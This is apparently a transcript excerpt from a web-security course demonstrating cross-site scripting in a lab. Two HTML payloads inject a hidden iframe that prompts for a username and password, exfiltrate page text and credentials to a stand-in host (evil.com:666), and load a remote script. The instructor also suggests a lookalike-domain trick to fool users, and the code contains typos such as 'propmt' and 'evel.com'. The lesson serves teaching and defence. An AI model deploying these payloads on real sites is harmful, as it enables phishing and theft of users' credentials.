Instructor: [0:00] Now that we've blocked all JavaScript execution except from infected sources, let's put our attacker hat back on. **JavaScript isn't the only type of possibly malicious content we can inject onto our target site. We could use iframes**. We can start with a hijacked script and save it as a new file.

[0:18] We'll call this `steal.html` and we'll place it back in the script tag again (all of the code from `payload.html`). **However, instead of trying to take the body of the document, we're going to prompt the user for the username and password**. We can go back to our payload and instead of a script tag, we can add an iframe. We'll say `steal.html` and we'll make this a hidden iframe so the user can't see it.

### steal.html

```html
<script>
  const payload = propmt('enter your username and password')
  const img = new Image()
  img.src = `https://evel.com:666/hijack?payload=${payload}`
</script>

<script src="https://evil.com:666/hijack.js"></script>
```

### payload.html

```html
<script>
  const payload = encodeURIComponent(document.body.innerText)
  const img = new Image()
  img.src = `https://evel.com:666/hijack?payload=${payload}`
</script>

<script src="https://evil.com:666/hijack.js"></script>
<iframe hidden src="https://evil.com:666/steal.html"></iframe>
```

[0:58] We'll log back into our site. We'll paste in our payload, hit submit.

[1:08] Now, you could see it says an embedded page at evil.com says, but if I would be clever, I could change my URL to be localhost.charlesproxy with a zero instead of an O .com. The user might not notice.

[1:22] User now enters in their username and password here, believing it to re-prompt from the target site rather than from a malicious site, hits OK. We could see that the hijack has succeeded again, stealing my username and password.
